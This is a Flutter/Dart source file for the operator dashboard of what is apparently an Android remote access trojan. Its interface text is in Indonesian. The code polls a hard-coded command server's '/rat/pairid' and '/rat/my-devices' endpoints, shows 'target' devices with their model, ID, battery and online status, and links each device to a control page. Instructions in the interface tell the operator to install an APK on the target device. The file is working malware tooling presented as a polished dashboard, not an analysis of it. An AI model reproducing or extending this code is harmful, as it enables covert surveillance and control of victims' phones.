import 'package:flutter/material.dart';
import 'package:flutter/services.dart';
import 'package:http/http.dart' as http;
import 'dart:convert';
import 'dart:async';
import 'dart:ui';
import 'package:provider/provider.dart';
import 'theme_provider.dart';
import 'control_panel.dart';

// Palet Warna Cyber Dashboard Premium
const Color _bgDark = Color(0xFF090D18);
const Color _cardDark = Color(0xFF121B2B);
const Color _neonCyan = Color(0xFF00E5FF);
const Color _neonBlue = Color(0xFF00B8FF);
const Color _neonPurple = Color(0xFF7B61FF);
const String _fontFamily = 'Poppins'; // Ganti 'Orbitron' atau 'Rajdhani' jika font tersedia

class DeviceDashboardPage extends StatefulWidget {
  final String username;
  final String role;
  final String sessionKey;
  
  const DeviceDashboardPage({
    super.key,
    this.username = '',
    this.role = '',
    this.sessionKey = '',
  });
  
  @override
  State<DeviceDashboardPage> createState() => _DDState();
}

class _DDState extends State<DeviceDashboardPage> with TickerProviderStateMixin {
  List<dynamic> _visible = [];
  bool _loading = true;
  String? _errorMsg;
  String _pairId = '';
  Timer? _timer;
  
  late AnimationController _animCtrl;
  late Animation<double> _fadeIn;

  @override
  void initState() {
    super.initState();
    _animCtrl = AnimationController(vsync: this, duration: const Duration(milliseconds: 800));
    _fadeIn = CurvedAnimation(parent: _animCtrl, curve: Curves.easeIn);
    _animCtrl.forward();
    _loadAll();
    _timer = Timer.periodic(const Duration(seconds: 20), (_) => _loadAll());
  }

  @override
  void dispose() {
    _timer?.cancel();
    _animCtrl.dispose();
    super.dispose();
  }

  // ── Logic API Tetap Dipertahankan Sesuai Aslinya ────────────────────────
  Future<void> _loadAll() async {
    if (!mounted) return;
    try {
      final pRes = await http
          .get(Uri.parse('http://public-gacor67.zone.id:2357/rat/pairid?key=${widget.sessionKey}'))
          .timeout(const Duration(seconds: 8));
      if (pRes.statusCode == 200) {
        final pd = jsonDecode(pRes.body);
        if (pd['valid'] == true && pd['pairId'] != null) {
          if (mounted) setState(() => _pairId = pd['pairId'].toString());
        }
      }

      final dRes = await http
          .get(Uri.parse('http://public-gacor67.zone.id:2357/rat/my-devices?key=${widget.sessionKey}'))
          .timeout(const Duration(seconds: 10));

      if (!mounted) return;
      if (dRes.statusCode != 200) {
        setState(() { _loading = false; _errorMsg = 'Kesalahan server ${dRes.statusCode}'; });
        return;
      }

      final body = jsonDecode(dRes.body);
      if (body['valid'] != true) {
        setState(() { _loading = false; _errorMsg = body['message'] ?? 'Error'; });
        return;
      }

      List<dynamic> devices = List<dynamic>.from(body['devices'] ?? []);
      final now = DateTime.now();
      for (var d in devices) {
        try {
          final seen = DateTime.parse(d['lastSeen']?.toString() ?? '');
          d['online'] = now.difference(seen).inSeconds < 30;
        } catch (_) { d['online'] = false; }
      }

      if (mounted) setState(() {
        _visible = devices;
        _loading = false;
        _errorMsg = null;
        _animCtrl.reset();
        _animCtrl.forward();
      });
    } catch (e) {
      if (mounted) setState(() { _loading = false; _errorMsg = e.toString(); });
    }
  }

  int get _active => _visible.where((d) => d['online'] == true).length;

  // ── UI Snackbar Diperbarui Menjadi Modern ───────────────────────────────
  void _copyPairId() {
    if (_pairId.isEmpty) return;
    Clipboard.setData(ClipboardData(text: _pairId));
    ScaffoldMessenger.of(context).showSnackBar(SnackBar(
      backgroundColor: _cardDark,
      behavior: SnackBarBehavior.floating,
      shape: RoundedRectangleBorder(
        borderRadius: BorderRadius.circular(16),
        side: BorderSide(color: _neonCyan.withOpacity(0.5), width: 1.5),
      ),
      content: Row(
        children: [
          Icon(Icons.check_circle_rounded, color: _neonCyan, size: 24),
          const SizedBox(width: 12),
          const Text(
            'ID Pairing berhasil disalin!',
            style: TextStyle(fontFamily: _fontFamily, color: Colors.white, fontWeight: FontWeight.w500),
          ),
        ],
      ),
      duration: const Duration(seconds: 2),
      elevation: 10,
    ));
  }

  @override
  Widget build(BuildContext context) {
    return Scaffold(
      backgroundColor: _bgDark,
      body: SafeArea(
        child: FadeTransition(
          opacity: _fadeIn,
          child: Column(
            children: [
              // ─── Header: Glassmorphism & Neon Gradient ─────────────────────
              ClipRRect(
                borderRadius: const BorderRadius.only(
                  bottomLeft: Radius.circular(32),
                  bottomRight: Radius.circular(32),
                ),
                child: BackdropFilter(
                  filter: ImageFilter.blur(sigmaX: 15, sigmaY: 15),
                  child: Container(
                    padding: const EdgeInsets.fromLTRB(24, 20, 24, 28),
                    decoration: BoxDecoration(
                      color: _cardDark.withOpacity(0.7),
                      border: Border(
                        bottom: BorderSide(color: _neonPurple.withOpacity(0.3), width: 1.5),
                      ),
                      boxShadow: [
                        BoxShadow(
                          color: _neonBlue.withOpacity(0.1),
                          blurRadius: 30,
                          spreadRadius: 5,
                        ),
                      ],
                    ),
                    child: Column(
                      children: [
                        Row(
                          children: [
                            _statBox('ONLINE', '$_active', _neonCyan),
                            const Spacer(),
                            Column(
                              children: [
                                Text(
                                  'CYBER DASHBOARD',
                                  style: TextStyle(
                                    fontFamily: _fontFamily,
                                    color: Colors.white,
                                    fontSize: 14,
                                    letterSpacing: 3.5,
                                    fontWeight: FontWeight.w800,
                                    shadows: [
                                      Shadow(color: _neonBlue.withOpacity(0.8), blurRadius: 12)
                                    ],
                                  ),
                                ),
                                const SizedBox(height: 6),
                                Container(
                                  padding: const EdgeInsets.symmetric(horizontal: 10, vertical: 4),
                                  decoration: BoxDecoration(
                                    color: _neonPurple.withOpacity(0.15),
                                    borderRadius: BorderRadius.circular(12),
                                    border: Border.all(color: _neonPurple.withOpacity(0.4)),
                                  ),
                                  child: Text(
                                    '@${widget.username}',
                                    style: const TextStyle(
                                      fontFamily: _fontFamily,
                                      color: Colors.white70,
                                      fontSize: 10,
                                      fontWeight: FontWeight.w500,
                                      letterSpacing: 1.0,
                                    ),
                                  ),
                                ),
                              ],
                            ),
                            const Spacer(),
                            _statBox('TOTAL', '${_visible.length}', _neonPurple),
                          ],
                        ),
                        // ── Pairing ID Premium Card ──────────────────────────
                        if (_pairId.isNotEmpty) ...[
                          const SizedBox(height: 24),
                          Material(
                            color: Colors.transparent,
                            child: InkWell(
                              onTap: _copyPairId,
                              borderRadius: BorderRadius.circular(20),
                              splashColor: _neonCyan.withOpacity(0.2),
                              highlightColor: _neonCyan.withOpacity(0.1),
                              child: Container(
                                width: double.infinity,
                                padding: const EdgeInsets.symmetric(horizontal: 20, vertical: 18),
                                decoration: BoxDecoration(
                                  gradient: LinearGradient(
                                    colors: [_neonBlue.withOpacity(0.1), _neonPurple.withOpacity(0.05)],
                                    begin: Alignment.topLeft,
                                    end: Alignment.bottomRight,
                                  ),
                                  borderRadius: BorderRadius.circular(20),
                                  border: Border.all(color: _neonCyan.withOpacity(0.4), width: 1.2),
                                  boxShadow: [
                                    BoxShadow(
                                      color: _neonCyan.withOpacity(0.08),
                                      blurRadius: 16,
                                      spreadRadius: 2,
                                    ),
                                  ],
                                ),
                                child: Row(
                                  children: [
                                    Container(
                                      padding: const EdgeInsets.all(10),
                                      decoration: BoxDecoration(
                                        color: _neonCyan.withOpacity(0.1),
                                        shape: BoxShape.circle,
                                      ),
                                      child: const Icon(Icons.qr_code_scanner_rounded, color: _neonCyan, size: 24),
                                    ),
                                    const SizedBox(width: 16),
                                    Expanded(
                                      child: Column(
                                        crossAxisAlignment: CrossAxisAlignment.start,
                                        children: [
                                          const Text(
                                            'ID PAIRING PERANGKAT',
                                            style: TextStyle(
                                              fontFamily: _fontFamily,
                                              color: Colors.white54,
                                              fontSize: 10,
                                              fontWeight: FontWeight.w600,
                                              letterSpacing: 1.5,
                                            ),
                                          ),
                                          const SizedBox(height: 6),
                                          Text(
                                            _pairId,
                                            style: const TextStyle(
                                              fontFamily: 'monospace',
                                              color: Colors.white,
                                              fontSize: 22,
                                              fontWeight: FontWeight.bold,
                                              letterSpacing: 6,
                                              shadows: [
                                                Shadow(color: _neonCyan, blurRadius: 8)
                                              ],
                                            ),
                                          ),
                                        ],
                                      ),
                                    ),
                                    const SizedBox(width: 8),
                                    Column(
                                      children: [
                                        const Icon(Icons.content_copy_rounded, color: _neonCyan, size: 22),
                                        const SizedBox(height: 4),
                                        Text(
                                          'SALIN',
                                          style: TextStyle(
                                            fontFamily: _fontFamily,
                                            color: _neonCyan.withOpacity(0.9),
                                            fontSize: 9,
                                            fontWeight: FontWeight.bold,
                                          ),
                                        ),
                                      ],
                                    ),
                                  ],
                                ),
                              ),
                            ),
                          ),
                          const SizedBox(height: 12),
                          const Text(
                            'Tap kartu di atas untuk menyalin ID unik akun Anda',
                            style: TextStyle(
                              fontFamily: _fontFamily,
                              color: Colors.white38,
                              fontSize: 11,
                            ),
                            textAlign: TextAlign.center,
                          ),
                        ],
                      ],
                    ),
                  ),
                ),
              ),

              // ─── Error Banner ──────────────────────────────────────────────
              if (_errorMsg != null)
                Padding(
                  padding: const EdgeInsets.fromLTRB(20, 16, 20, 0),
                  child: _banner(Icons.error_outline_rounded, _errorMsg!, Colors.redAccent),
                ),

              // ─── Toolbar (Ripple & Glow Buttons) ───────────────────────────
              Padding(
                padding: const EdgeInsets.fromLTRB(24, 20, 24, 12),
                child: Row(
                  children: [
                    Text(
                      'PERANGKAT TERHUBUNG',
                      style: TextStyle(
                        fontFamily: _fontFamily,
                        color: Colors.white.withOpacity(0.7),
                        fontSize: 12,
                        fontWeight: FontWeight.w700,
                        letterSpacing: 2.0,
                      ),
                    ),
                    const Spacer(),
                    _glassButton(
                      icon: Icons.refresh_rounded,
                      color: _neonCyan,
                      onTap: () {
                        setState(() { _loading = true; _errorMsg = null; });
                        _loadAll();
                      },
                    ),
                    const SizedBox(width: 14),
                    _glassButton(
                      icon: Icons.close_rounded,
                      color: Colors.redAccent,
                      onTap: () => Navigator.pop(context),
                    ),
                  ],
                ),
              ),

              // ─── Grid Perangkat (Animasi & Shimmer) ────────────────────────
              Expanded(
                child: _loading
                    ? const _ShimmerLoadingGrid() // Memanggil Custom Shimmer
                    : _visible.isEmpty
                        ? _buildEmptyState()
                        : GridView.builder(
                            padding: const EdgeInsets.fromLTRB(20, 8, 20, 40),
                            gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
                              crossAxisCount: 3,
                              crossAxisSpacing: 14,
                              mainAxisSpacing: 14,
                              childAspectRatio: 0.72,
                            ),
                            itemCount: _visible.length,
                            itemBuilder: (ctx, i) {
                              final d = _visible[i];
                              final on = d['online'] == true;
                              final statusColor = on ? _neonCyan : Colors.white38;

                              // Animasi Slide & Scale saat item muncul
                              return TweenAnimationBuilder<double>(
                                tween: Tween(begin: 0.0, end: 1.0),
                                duration: Duration(milliseconds: 400 + (i * 100).clamp(0, 600)),
                                curve: Curves.easeOutCubic,
                                builder: (context, val, child) {
                                  return Transform.translate(
                                    offset: Offset(0, 30 * (1 - val)),
                                    child: Transform.scale(
                                      scale: 0.9 + (0.1 * val),
                                      child: Opacity(
                                        opacity: val,
                                        child: child,
                                      ),
                                    ),
                                  );
                                },
                                child: Material(
                                  color: Colors.transparent,
                                  child: InkWell(
                                    borderRadius: BorderRadius.circular(24),
                                    splashColor: statusColor.withOpacity(0.2),
                                    highlightColor: statusColor.withOpacity(0.1),
                                    onTap: () => Navigator.push(
                                      ctx,
                                      MaterialPageRoute(
                                        builder: (_) => ControlCenterPage(
                                          targetDevice: d,
                                          role: widget.role,
                                        ),
                                      ),
                                    ),
                                    child: Container(
                                      padding: const EdgeInsets.all(14),
                                      decoration: BoxDecoration(
                                        color: _cardDark,
                                        borderRadius: BorderRadius.circular(24),
                                        border: Border.all(
                                          color: on ? statusColor.withOpacity(0.5) : Colors.white12,
                                          width: 1.5,
                                        ),
                                        boxShadow: on
                                            ? [
                                                BoxShadow(
                                                  color: statusColor.withOpacity(0.15),
                                                  blurRadius: 15,
                                                  spreadRadius: 1,
                                                )
                                              ]
                                            : null,
                                      ),
                                      child: Column(
                                        crossAxisAlignment: CrossAxisAlignment.start,
                                        children: [
                                          Row(
                                            mainAxisAlignment: MainAxisAlignment.spaceBetween,
                                            children: [
                                              Icon(Icons.smartphone_rounded, color: on ? Colors.white : Colors.white38, size: 20),
                                              Container(
                                                padding: const EdgeInsets.symmetric(horizontal: 8, vertical: 4),
                                                decoration: BoxDecoration(
                                                  color: statusColor.withOpacity(0.15),
                                                  borderRadius: BorderRadius.circular(10),
                                                  border: Border.all(color: statusColor.withOpacity(0.4)),
                                                ),
                                                child: Row(
                                                  children: [
                                                    Container(
                                                      width: 6,
                                                      height: 6,
                                                      decoration: BoxDecoration(
                                                        color: statusColor,
                                                        shape: BoxShape.circle,
                                                        boxShadow: on ? [BoxShadow(color: statusColor, blurRadius: 4)] : [],
                                                      ),
                                                    ),
                                                    const SizedBox(width: 4),
                                                    Text(
                                                      on ? 'ON' : 'OFF',
                                                      style: TextStyle(
                                                        fontFamily: _fontFamily,
                                                        color: statusColor,
                                                        fontSize: 9,
                                                        fontWeight: FontWeight.bold,
                                                      ),
                                                    ),
                                                  ],
                                                ),
                                              ),
                                            ],
                                          ),
                                          const Spacer(),
                                          Text(
                                            d['model'] ?? 'Unknown',
                                            style: TextStyle(
                                              fontFamily: _fontFamily,
                                              color: on ? Colors.white : Colors.white54,
                                              fontSize: 12,
                                              fontWeight: FontWeight.w700,
                                            ),
                                            maxLines: 1,
                                            overflow: TextOverflow.ellipsis,
                                          ),
                                          const SizedBox(height: 4),
                                          Text(
                                            d['id'] ?? '-',
                                            style: const TextStyle(
                                              fontFamily: 'monospace',
                                              color: Colors.white38,
                                              fontSize: 9,
                                            ),
                                            maxLines: 1,
                                            overflow: TextOverflow.ellipsis,
                                          ),
                                          const Spacer(),
                                          Row(
                                            children: [
                                              Icon(Icons.battery_charging_full_rounded, color: on ? _neonCyan : Colors.white38, size: 14),
                                              const SizedBox(width: 6),
                                              Text(
                                                '${d['battery'] ?? '?'}%',
                                                style: TextStyle(
                                                  fontFamily: _fontFamily,
                                                  color: on ? Colors.white : Colors.white38,
                                                  fontSize: 11,
                                                  fontWeight: FontWeight.w600,
                                                ),
                                              ),
                                            ],
                                          ),
                                        ],
                                      ),
                                    ),
                                  ),
                                ),
                              );
                            },
                          ),
              ),
            ],
          ),
        ),
      ),
    );
  }

  // ── Helper Widgets ────────────────────────────────────────────────────────
  Widget _glassButton({required IconData icon, required Color color, required VoidCallback onTap}) {
    return Material(
      color: Colors.transparent,
      child: InkWell(
        onTap: onTap,
        borderRadius: BorderRadius.circular(16),
        splashColor: color.withOpacity(0.3),
        child: Container(
          padding: const EdgeInsets.all(10),
          decoration: BoxDecoration(
            color: _cardDark,
            borderRadius: BorderRadius.circular(16),
            border: Border.all(color: color.withOpacity(0.4), width: 1.2),
            boxShadow: [
              BoxShadow(color: color.withOpacity(0.15), blurRadius: 10),
            ],
          ),
          child: Icon(icon, color: color, size: 20),
        ),
      ),
    );
  }

  Widget _buildEmptyState() {
    return Center(
      child: TweenAnimationBuilder<double>(
        tween: Tween(begin: 0.8, end: 1.0),
        duration: const Duration(milliseconds: 600),
        curve: Curves.elasticOut,
        builder: (context, scale, child) {
          return Transform.scale(
            scale: scale,
            child: Opacity(
              opacity: scale.clamp(0.0, 1.0),
              child: child,
            ),
          );
        },
        child: Column(
          mainAxisSize: MainAxisSize.min,
          children: [
            Container(
              padding: const EdgeInsets.all(24),
              decoration: BoxDecoration(
                color: _neonBlue.withOpacity(0.05),
                shape: BoxShape.circle,
                boxShadow: [
                  BoxShadow(color: _neonBlue.withOpacity(0.1), blurRadius: 30, spreadRadius: 10),
                ],
              ),
              child: Icon(Icons.devices_other_rounded, color: _neonBlue.withOpacity(0.6), size: 72),
            ),
            const SizedBox(height: 24),
            const Text(
              'BELUM ADA PERANGKAT',
              style: TextStyle(
                fontFamily: _fontFamily,
                color: Colors.white,
                fontWeight: FontWeight.bold,
                letterSpacing: 2.5,
                fontSize: 16,
                shadows: [Shadow(color: _neonBlue, blurRadius: 10)],
              ),
            ),
            const SizedBox(height: 8),
            const Text(
              'Menunggu koneksi dari target...',
              style: TextStyle(fontFamily: _fontFamily, color: Colors.white54, fontSize: 13),
            ),
            const SizedBox(height: 32),
            Container(
              margin: const EdgeInsets.symmetric(horizontal: 32),
              padding: const EdgeInsets.all(24),
              decoration: BoxDecoration(
                color: _cardDark,
                borderRadius: BorderRadius.circular(24),
                border: Border.all(color: _neonBlue.withOpacity(0.3), width: 1.5),
              ),
              child: Column(
                children: [
                  const Icon(Icons.info_outline_rounded, color: _neonCyan, size: 32),
                  const SizedBox(height: 16),
                  const Text(
                    'Instruksi Instalasi:',
                    style: TextStyle(
                      fontFamily: _fontFamily,
                      color: Colors.white,
                      fontSize: 14,
                      fontWeight: FontWeight.bold,
                    ),
                  ),
                  const SizedBox(height: 12),
                  Text(
                    '1. Pasang APK pada perangkat target\n2. Buka aplikasi & masukkan ID Pairing\n3. Perangkat akan muncul otomatis di sini',
                    style: TextStyle(fontFamily: _fontFamily, color: Colors.white.withOpacity(0.6), fontSize: 12, height: 1.6),
                    textAlign: TextAlign.center,
                  ),
                ],
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _banner(IconData icon, String msg, Color c) {
    return Container(
      padding: const EdgeInsets.all(16),
      decoration: BoxDecoration(
        color: _cardDark,
        borderRadius: BorderRadius.circular(16),
        border: Border.all(color: c.withOpacity(0.5), width: 1.5),
        boxShadow: [BoxShadow(color: c.withOpacity(0.1), blurRadius: 10)],
      ),
      child: Row(
        crossAxisAlignment: CrossAxisAlignment.center,
        children: [
          Icon(icon, color: c, size: 24),
          const SizedBox(width: 16),
          Expanded(
            child: Text(
              msg,
              style: TextStyle(fontFamily: _fontFamily, color: Colors.white, fontSize: 12, fontWeight: FontWeight.w500),
            ),
          ),
        ],
      ),
    );
  }

  Widget _statBox(String label, String value, Color neonColor) {
    return Column(
      children: [
        Text(
          label,
          style: TextStyle(
            fontFamily: _fontFamily,
            color: Colors.white54,
            fontSize: 10,
            fontWeight: FontWeight.w600,
            letterSpacing: 1.5,
          ),
        ),
        const SizedBox(height: 6),
        Text(
          value,
          style: TextStyle(
            fontFamily: _fontFamily,
            color: neonColor,
            fontSize: 26,
            fontWeight: FontWeight.w800,
            shadows: [Shadow(blurRadius: 15, color: neonColor)],
          ),
        ),
      ],
    );
  }
}

// ── Custom Shimmer Widget untuk Loading ───────────────────────────────────
class _ShimmerLoadingGrid extends StatefulWidget {
  const _ShimmerLoadingGrid();
  @override
  State<_ShimmerLoadingGrid> createState() => _ShimmerLoadingGridState();
}

class _ShimmerLoadingGridState extends State<_ShimmerLoadingGrid> with SingleTickerProviderStateMixin {
  late AnimationController _shimmerCtrl;

  @override
  void initState() {
    super.initState();
    _shimmerCtrl = AnimationController(vsync: this, duration: const Duration(milliseconds: 1000))..repeat(reverse: true);
  }

  @override
  void dispose() {
    _shimmerCtrl.dispose();
    super.dispose();
  }

  @override
  Widget build(BuildContext context) {
    return GridView.builder(
      padding: const EdgeInsets.fromLTRB(20, 8, 20, 40),
      gridDelegate: const SliverGridDelegateWithFixedCrossAxisCount(
        crossAxisCount: 3,
        crossAxisSpacing: 14,
        mainAxisSpacing: 14,
        childAspectRatio: 0.72,
      ),
      itemCount: 6,
      itemBuilder: (ctx, i) {
        return AnimatedBuilder(
          animation: _shimmerCtrl,
          builder: (context, child) {
            return Container(
              decoration: BoxDecoration(
                color: _cardDark,
                borderRadius: BorderRadius.circular(24),
                border: Border.all(color: _neonCyan.withOpacity(0.1 + (_shimmerCtrl.value * 0.2)), width: 1.5),
                boxShadow: [
                  BoxShadow(color: _neonCyan.withOpacity(_shimmerCtrl.value * 0.1), blurRadius: 15),
                ],
              ),
              child: Center(
                child: Icon(Icons.smartphone_rounded, color: Colors.white.withOpacity(0.1 + (_shimmerCtrl.value * 0.2)), size: 32),
              ),
            );
          },
        );
      },
    );
  }
}
